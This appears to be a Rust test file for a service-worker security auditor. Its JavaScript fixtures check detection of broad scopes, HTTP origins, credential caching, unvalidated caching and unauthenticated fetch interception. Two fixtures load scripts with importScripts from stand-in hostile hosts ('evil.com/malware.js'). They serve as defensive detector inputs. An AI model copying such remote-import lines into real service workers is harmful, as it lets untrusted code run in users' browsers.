use crate::service_worker_audit::*;

#[test]
fn empty_body_no_issues() {
    let issues = analyze_service_worker("", false);
    assert!(issues.is_empty());
}

#[test]
fn no_sw_api_no_issues() {
    let body = "<script>var x = 1; console.log('hello');</script>";
    let issues = analyze_service_worker(body, false);
    assert!(issues.is_empty());
}

#[test]
fn api_detected_basic() {
    let body = r#"<script>navigator.serviceWorker.register("/sw.js");</script>"#;
    let issues = analyze_service_worker(body, false);
    assert!(
        issues
            .iter()
            .any(|i| matches!(i, ServiceWorkerIssue::ApiDetected))
    );
}

#[test]
fn api_detected_service_worker_global() {
    let body = "if (typeof ServiceWorker !== 'undefined') { }";
    let issues = analyze_service_worker(body, false);
    assert!(
        issues
            .iter()
            .any(|i| matches!(i, ServiceWorkerIssue::ApiDetected))
    );
}

#[test]
fn api_detected_controller() {
    let body = "if (navigator.serviceWorker.controller) { }";
    let issues = analyze_service_worker(body, false);
    assert!(
        issues
            .iter()
            .any(|i| matches!(i, ServiceWorkerIssue::ApiDetected))
    );
}

#[test]
fn http_origin_flagged() {
    let body = r#"navigator.serviceWorker.register("/sw.js");"#;
    let issues = analyze_service_worker(body, true);
    assert!(
        issues
            .iter()
            .any(|i| matches!(i, ServiceWorkerIssue::HttpOrigin))
    );
}

#[test]
fn https_origin_not_flagged() {
    let body = r#"navigator.serviceWorker.register("/sw.js");"#;
    let issues = analyze_service_worker(body, false);
    assert!(
        !issues
            .iter()
            .any(|i| matches!(i, ServiceWorkerIssue::HttpOrigin))
    );
}

#[test]
fn broad_scope_root() {
    let body = r#"navigator.serviceWorker.register("/sw.js", {scope: "/"});"#;
    let issues = analyze_service_worker(body, false);
    assert!(
        issues
            .iter()
            .any(|i| matches!(i, ServiceWorkerIssue::BroadScope { scope } if scope == "/"))
    );
}

#[test]
fn broad_scope_wildcard() {
    let body = r#"navigator.serviceWorker.register("/sw.js", {scope: "/*"});"#;
    let issues = analyze_service_worker(body, false);
    assert!(
        issues
            .iter()
            .any(|i| matches!(i, ServiceWorkerIssue::BroadScope { scope } if scope == "/*"))
    );
}

#[test]
fn narrow_scope_not_flagged() {
    let body = r#"navigator.serviceWorker.register("/sw.js", {scope: "/app/"});"#;
    let issues = analyze_service_worker(body, false);
    assert!(
        !issues
            .iter()
            .any(|i| matches!(i, ServiceWorkerIssue::BroadScope { .. }))
    );
}

#[test]
fn external_import_https() {
    let body = r#"importScripts("https://cdn.example.com/lib.js");"#;
    let issues = analyze_service_worker(body, false);
    assert!(issues.iter().any(|i| matches!(
        i,
        ServiceWorkerIssue::ExternalImport { url }
            if url == "https://cdn.example.com/lib.js"
    )));
}

#[test]
fn external_import_http() {
    let body = r#"importScripts("http://evil.com/malware.js");"#;
    let issues = analyze_service_worker(body, false);
    assert!(issues.iter().any(|i| matches!(
        i,
        ServiceWorkerIssue::ExternalImport { url }
            if url == "http://evil.com/malware.js"
    )));
}

#[test]
fn local_import_not_flagged() {
    let body = r#"importScripts("/lib/utils.js");"#;
    let issues = analyze_service_worker(body, false);
    assert!(
        !issues
            .iter()
            .any(|i| matches!(i, ServiceWorkerIssue::ExternalImport { .. }))
    );
}

#[test]
fn caches_credentials_authorization() {
    let body = r#"
        navigator.serviceWorker.register("/sw.js");
        caches.open("v1").then(cache => {
            cache.put(request.clone(), response.clone());
        });
        const auth = request.headers.get('Authorization');
    "#;
    let issues = analyze_service_worker(body, false);
    assert!(
        issues
            .iter()
            .any(|i| matches!(i, ServiceWorkerIssue::CachesCredentials))
    );
}

#[test]
fn caches_credentials_cookie() {
    let body = r#"
        ServiceWorker.addEventListener('fetch', e => {
            caches.match(e.request).then(r => {
                if (r && r.headers.get('Cookie')) return r;
            });
        });
    "#;
    let issues = analyze_service_worker(body, false);
    assert!(
        issues
            .iter()
            .any(|i| matches!(i, ServiceWorkerIssue::CachesCredentials))
    );
}

#[test]
fn caches_credentials_token() {
    let body = r#"
        navigator.serviceWorker.register("/sw.js");
        cache.add('/api/data?Token=secret');
    "#;
    let issues = analyze_service_worker(body, false);
    assert!(
        issues
            .iter()
            .any(|i| matches!(i, ServiceWorkerIssue::CachesCredentials))
    );
}

#[test]
fn caches_credentials_password() {
    let body = r#"
        ServiceWorker.register();
        caches.open('data').then(c => c.put('/login', response)); // has password field
    "#;
    let issues = analyze_service_worker(body, false);
    assert!(
        issues
            .iter()
            .any(|i| matches!(i, ServiceWorkerIssue::CachesCredentials))
    );
}

#[test]
fn caches_credentials_secret() {
    let body = r#"
        navigator.serviceWorker.controller;
        cache.put(req, resp); // caching secret data
    "#;
    let issues = analyze_service_worker(body, false);
    assert!(
        issues
            .iter()
            .any(|i| matches!(i, ServiceWorkerIssue::CachesCredentials))
    );
}

#[test]
fn cache_without_credentials_not_flagged() {
    let body = r#"
        navigator.serviceWorker.register("/sw.js");
        caches.open("v1").then(cache => {
            cache.put(request, response);
        });
    "#;
    let issues = analyze_service_worker(body, false);
    assert!(
        !issues
            .iter()
            .any(|i| matches!(i, ServiceWorkerIssue::CachesCredentials))
    );
}

#[test]
fn unvalidated_cache_put_flagged() {
    let body = r#"
        navigator.serviceWorker.register("/sw.js");
        cache.put(request, response);
    "#;
    let issues = analyze_service_worker(body, false);
    assert!(
        issues
            .iter()
            .any(|i| matches!(i, ServiceWorkerIssue::UnvalidatedCachePut))
    );
}

#[test]
fn validated_cache_put_not_flagged() {
    let body = r#"
        navigator.serviceWorker.register("/sw.js");
        if (response.ok && response.status === 200) {
            cache.put(request, response);
        }
    "#;
    let issues = analyze_service_worker(body, false);
    assert!(
        !issues
            .iter()
            .any(|i| matches!(i, ServiceWorkerIssue::UnvalidatedCachePut))
    );
}

#[test]
fn interception_without_auth_flagged() {
    let body = r#"
        navigator.serviceWorker.register("/sw.js");
        addEventListener('fetch', event => {
            event.respondWith(fetch(event.request));
        });
    "#;
    let issues = analyze_service_worker(body, false);
    assert!(
        issues
            .iter()
            .any(|i| matches!(i, ServiceWorkerIssue::InterceptionWithoutAuth))
    );
}

#[test]
fn interception_with_auth_check_not_flagged() {
    let body = r#"
        navigator.serviceWorker.register("/sw.js");
        addEventListener("fetch", event => {
            const auth = event.request.headers.get('Authorization');
            if (auth && verifyToken(auth)) {
                event.respondWith(fetch(event.request));
            }
        });
    "#;
    let issues = analyze_service_worker(body, false);
    assert!(
        !issues
            .iter()
            .any(|i| matches!(i, ServiceWorkerIssue::InterceptionWithoutAuth))
    );
}

#[test]
fn no_update_mechanism_flagged() {
    let body = r#"
        navigator.serviceWorker.register("/sw.js");
        addEventListener('install', event => {
            console.log('installed');
        });
    "#;
    let issues = analyze_service_worker(body, false);
    assert!(
        issues
            .iter()
            .any(|i| matches!(i, ServiceWorkerIssue::NoUpdateMechanism))
    );
}

#[test]
fn skipwaiting_present_not_flagged() {
    let body = r#"
        navigator.serviceWorker.register("/sw.js");
        addEventListener('install', event => {
            self.skipWaiting();
        });
    "#;
    let issues = analyze_service_worker(body, false);
    assert!(
        !issues
            .iter()
            .any(|i| matches!(i, ServiceWorkerIssue::NoUpdateMechanism))
    );
}

#[test]
fn clients_claim_present_not_flagged() {
    let body = r#"
        navigator.serviceWorker.register("/sw.js");
        addEventListener('activate', event => {
            clients.claim();
        });
    "#;
    let issues = analyze_service_worker(body, false);
    assert!(
        !issues
            .iter()
            .any(|i| matches!(i, ServiceWorkerIssue::NoUpdateMechanism))
    );
}

#[test]
fn severity_ordering() {
    assert!(
        service_worker_severity(&ServiceWorkerIssue::ExternalImport {
            url: "https://x.com/a.js".into()
        }) > service_worker_severity(&ServiceWorkerIssue::InterceptionWithoutAuth)
    );
    assert!(
        service_worker_severity(&ServiceWorkerIssue::InterceptionWithoutAuth)
            > service_worker_severity(&ServiceWorkerIssue::HttpOrigin)
    );
    assert!(
        service_worker_severity(&ServiceWorkerIssue::HttpOrigin)
            > service_worker_severity(&ServiceWorkerIssue::CachesCredentials)
    );
    assert!(
        service_worker_severity(&ServiceWorkerIssue::CachesCredentials)
            > service_worker_severity(&ServiceWorkerIssue::UnvalidatedCachePut)
    );
    assert!(
        service_worker_severity(&ServiceWorkerIssue::UnvalidatedCachePut)
            > service_worker_severity(&ServiceWorkerIssue::BroadScope { scope: "/".into() })
    );
    assert!(
        service_worker_severity(&ServiceWorkerIssue::BroadScope { scope: "/".into() })
            > service_worker_severity(&ServiceWorkerIssue::NoUpdateMechanism)
    );
    assert!(
        service_worker_severity(&ServiceWorkerIssue::NoUpdateMechanism)
            > service_worker_severity(&ServiceWorkerIssue::ApiDetected)
    );
}

#[test]
fn to_operations_produces_entries() {
    let issues = vec![
        ServiceWorkerIssue::ApiDetected,
        ServiceWorkerIssue::HttpOrigin,
        ServiceWorkerIssue::CachesCredentials,
    ];
    let mut seq = 100u64;
    let ops = service_worker_to_operations(&issues, &mut seq);
    assert_eq!(ops.len(), 3);
    assert_eq!(seq, 103);
}

#[test]
fn to_operations_empty_input() {
    let issues: Vec<ServiceWorkerIssue> = vec![];
    let mut seq = 50u64;
    let ops = service_worker_to_operations(&issues, &mut seq);
    assert!(ops.is_empty());
    assert_eq!(seq, 50);
}

#[test]
fn display_api_detected() {
    assert_eq!(ServiceWorkerIssue::ApiDetected.to_string(), "api_detected");
}

#[test]
fn display_http_origin() {
    assert_eq!(ServiceWorkerIssue::HttpOrigin.to_string(), "http_origin");
}

#[test]
fn display_external_import() {
    assert_eq!(
        ServiceWorkerIssue::ExternalImport {
            url: "https://cdn.com/lib.js".into()
        }
        .to_string(),
        "external_import:https://cdn.com/lib.js"
    );
}

#[test]
fn display_broad_scope() {
    assert_eq!(
        ServiceWorkerIssue::BroadScope { scope: "/".into() }.to_string(),
        "broad_scope:/"
    );
}

#[test]
fn display_caches_credentials() {
    assert_eq!(
        ServiceWorkerIssue::CachesCredentials.to_string(),
        "caches_credentials"
    );
}

#[test]
fn display_unvalidated_cache_put() {
    assert_eq!(
        ServiceWorkerIssue::UnvalidatedCachePut.to_string(),
        "unvalidated_cache_put"
    );
}

#[test]
fn display_interception_without_auth() {
    assert_eq!(
        ServiceWorkerIssue::InterceptionWithoutAuth.to_string(),
        "interception_without_auth"
    );
}

#[test]
fn display_no_update_mechanism() {
    assert_eq!(
        ServiceWorkerIssue::NoUpdateMechanism.to_string(),
        "no_update_mechanism"
    );
}

#[test]
fn multiple_issues_detected() {
    let body = r#"
        navigator.serviceWorker.register("/sw.js", {scope: "/"});
        importScripts("https://cdn.evil.com/malware.js");
        addEventListener('fetch', e => {
            caches.match(e.request).then(resp => {
                if (resp) return resp;
                return fetch(e.request).then(r => {
                    cache.put(e.request, r.clone());
                    const auth = r.headers.get('Authorization');
                    return r;
                });
            });
        });
    "#;
    let issues = analyze_service_worker(body, true);
    assert!(issues.len() >= 6);
    assert!(
        issues
            .iter()
            .any(|i| matches!(i, ServiceWorkerIssue::ApiDetected))
    );
    assert!(
        issues
            .iter()
            .any(|i| matches!(i, ServiceWorkerIssue::HttpOrigin))
    );
    assert!(
        issues
            .iter()
            .any(|i| matches!(i, ServiceWorkerIssue::BroadScope { .. }))
    );
    assert!(
        issues
            .iter()
            .any(|i| matches!(i, ServiceWorkerIssue::ExternalImport { .. }))
    );
    assert!(
        issues
            .iter()
            .any(|i| matches!(i, ServiceWorkerIssue::CachesCredentials))
    );
}
